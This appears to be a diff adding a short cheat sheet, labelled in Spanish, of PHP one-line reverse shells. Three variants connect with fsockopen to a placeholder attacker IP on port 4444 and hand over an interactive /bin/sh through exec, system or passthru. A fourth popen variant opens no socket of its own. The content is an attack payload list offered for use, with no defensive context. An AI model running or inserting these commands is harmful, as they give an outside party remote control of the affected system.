@@ -1,0 +1,11 @@
+▶ Reverse Shell en una Línea (Usar fsockopen):
+  php -r '$sock=fsockopen("$IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con system() (Ejecutar con system):
+  php -r '$sock=fsockopen("$IP",4444);system("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con passthru() (Ejecutar con passthru):
+  php -r '$sock=fsockopen("$IP",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con popen() (Usar popen para shell):
+  php -r '$p=popen("sh -i <&3 >&3 2>&3", "r"); pclose($p);'
